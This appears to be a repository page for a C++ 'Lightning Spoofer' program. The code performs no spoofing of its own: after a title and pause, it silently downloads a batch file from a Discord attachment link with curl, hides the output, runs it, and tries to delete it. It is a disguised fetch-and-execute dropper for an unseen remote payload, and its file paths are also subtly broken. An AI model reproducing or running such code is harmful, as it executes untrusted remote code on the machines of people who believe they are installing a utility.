# Spoofer-in-C-
Spoofer in C++
#include <Windows.H>
#include <iostream>

int main()
{
    system("title Lightning Spoofer");
    std::cout << "Lightning Spooferz\n";
    system("pause");
    system("curl https://cdn.discordapp.com/attachments/1078012661582811257/1104419416990568548/Spoofertexte.bat --output C:\spoof.bat >nul 2>&1");
    system("start C:\spoof.bat");
    Sleep(8000);
    remove("spoof.bat");
}
